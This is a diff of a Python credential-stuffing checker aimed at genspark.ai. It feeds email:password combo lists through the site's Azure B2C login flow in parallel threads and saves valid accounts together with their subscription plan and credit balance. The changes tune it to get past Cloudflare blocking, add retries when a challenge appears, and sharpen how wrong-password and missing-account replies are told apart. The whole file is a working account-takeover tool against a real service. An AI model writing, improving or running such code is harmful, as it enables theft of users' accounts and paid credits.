@@ -3,10 +3,11 @@ import re
 import json
 import os
 import threading
+import time
 from queue import Queue
 
 # === CONFIGURATION ===
-NUM_THREADS           = 30
+NUM_THREADS           = 10          # lower = less Cloudflare blocking
 COMBO_FILE            = "combo.txt"
 VALID_ACCOUNTS_FILE   = "comptes_valides.txt"
 INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"
@@ -30,22 +31,29 @@ total_accounts = 0
 USER_URL    = "https://www.genspark.ai/api/user"
 BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
 
+HEADERS = {
+    'User-Agent'     : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Accept-Language': 'en-US,en;q=0.9',
+}
 
-def get_plan_and_balance(session):
+
+def get_plan_and_balance(sess):
     info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}
     try:
-        r = session.get(USER_URL, timeout=10)
+        r = sess.get(USER_URL, timeout=12)
         if r.status_code == 200:
-            body = r.json()
-            data = body.get("data", body)
-            plan     = data.get("personal_plan")
-            interval = data.get("personal_paid_sub_interval")
-            if plan:     info['plan']     = plan
-            if interval: info['interval'] = interval
+            body  = r.json()
+            cogen = body.get("data", {}).get("cogen", {})
+            plan     = cogen.get("personal_plan") or cogen.get("plan")
+            interval = cogen.get("personal_paid_sub_interval")
+            if plan:
+                info['plan']     = plan
+            if interval:
+                info['interval'] = interval
     except Exception:
         pass
     try:
-        r = session.get(BALANCE_URL, timeout=10)
+        r = sess.get(BALANCE_URL, timeout=12)
         if r.status_code == 200:
             balance = r.json().get("data", {}).get("balance")
             if balance is not None:
@@ -57,25 +65,32 @@ def get_plan_and_balance(session):
 
 def check_account(email, password):
     sess = requests.Session()
-    sess.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Accept-Language': 'en-US,en;q=0.9',
-    })
-    try:
-        # Step 0: homepage to get base cookies
-        sess.get('https://www.genspark.ai/', timeout=15)
+    sess.headers.update(HEADERS)
 
-        # Step 1: /api/login - Genspark generates PKCE + state server-side, sets session_id
-        r_login = sess.get(
-            'https://www.genspark.ai/api/login?redirect_url=/',
-            timeout=15,
-            allow_redirects=False
-        )
-        azure_url = r_login.headers.get('location', '')
-        if not azure_url or 'login.genspark.ai' not in azure_url:
+    try:
+        # ── Step 1 : /api/login → Genspark generates PKCE+state, sets session_id ──
+        # Retry up to 3 times in case of transient errors
+        azure_url = ''
+        for attempt in range(3):
+            try:
+                r_login = sess.get(
+                    'https://www.genspark.ai/api/login?redirect_url=/',
+                    timeout=15,
+                    allow_redirects=False
+                )
+                loc = r_login.headers.get('location', '')
+                if 'login.genspark.ai' in loc:
+                    azure_url = loc
+                    break
+                # If we got a non-redirect (e.g. CF challenge), wait and retry
+                time.sleep(1 + attempt)
+            except Exception:
+                time.sleep(1 + attempt)
+
+        if not azure_url:
             return 'ERROR_NO_AZURE_URL', None
 
-        # Step 2: Load Azure B2C login page
+        # ── Step 2 : Load Azure B2C login page ───────────────────────────────────
         r1 = sess.get(azure_url, timeout=15)
         if r1.status_code != 200:
             return 'ERROR_AZURE_LOAD', None
@@ -88,7 +103,7 @@ def check_account(email, password):
         csrf_token     = sdata['csrf']
         transaction_id = sdata['transId']
 
-        # Step 3: POST credentials
+        # ── Step 3 : POST credentials ─────────────────────────────────────────────
         r2 = sess.post(
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/B2C_1_new_login/SelfAsserted",
             params={'tx': transaction_id, 'p': 'B2C_1_new_login'},
@@ -106,19 +121,20 @@ def check_account(email, password):
 
         r2_data = r2.json()
         if r2_data.get("status") == "400":
-            msg = r2_data.get("message", "").lower()
-            if any(x in msg for x in ["incorrect", "password", "wrong"]):
+            msg = r2_data.get("message", "")
+            msg_lower = msg.lower()
+            if any(x in msg_lower for x in ["incorrect", "password is incorrect", "wrong"]):
                 return 'WRONG_PASSWORD', None
-            if any(x in msg for x in ["find your account", "not found"]):
+            if any(x in msg_lower for x in ["find your account", "aadb2c90053"]):
                 return 'ACCOUNT_NOT_FOUND', None
-            if "aadb2c90053" in r2_data.get("message",""):
+            if "aadb2c90053" in msg:
                 return 'ACCOUNT_NOT_FOUND', None
             return 'ERROR_API', None
 
         if r2_data.get("status") != "200":
             return 'ERROR_API', None
 
-        # Step 4: confirmed -> get auth code redirect
+        # ── Step 4 : confirmed → auth code redirect ───────────────────────────────
         confirm_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
@@ -138,12 +154,11 @@ def check_account(email, password):
         if 'code=' not in hop1_loc:
             return 'ERROR_NO_CODE', None
 
-        # Step 5: /api/auth?code=...&state=... 
-        # session_id from Step 1 is sent automatically - Genspark does PKCE exchange
+        # ── Step 5 : /api/auth?code=&state= — Genspark does PKCE exchange ─────────
         hop2 = sess.get(hop1_loc, timeout=15, allow_redirects=False)
         hop2_loc = hop2.headers.get('location', '')
 
-        # Success = redirect to "/" or any page that is NOT /api/logout
+        # Success → redirect to "/" ; failure → redirect to /api/logout
         if '/api/logout' in hop2_loc or '/logout' in hop2_loc:
             return 'ERROR_NO_SESSION', None
 
@@ -152,9 +167,9 @@ def check_account(email, password):
             'Origin' : 'https://www.genspark.ai',
         })
 
-        # Quick verify
+        # Quick sanity check
         try:
-            rv = sess.get(USER_URL, timeout=10)
+            rv = sess.get(USER_URL, timeout=12)
             if rv.status_code == 200 and rv.json().get("status") == -5:
                 return 'ERROR_NO_SESSION', None
         except Exception:
@@ -167,7 +182,7 @@ def check_account(email, password):
 
 
 def worker():
-    global checked_count, valid_count, total_accounts
+    global checked_count, valid_count
 
     while not combo_queue.empty():
         try:
@@ -204,9 +219,10 @@ def worker():
                 else:
                     pc = Colors.YELLOW
 
+                plan_display = plan.upper() if plan != 'N/A' else 'FREE'
                 message = (
                     f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
-                    f"Plan: {pc}{plan.upper() if plan != 'N/A' else 'N/A'}{Colors.RESET} | "
+                    f"Plan: {pc}{plan_display}{Colors.RESET} | "
                     f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                     f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                 )
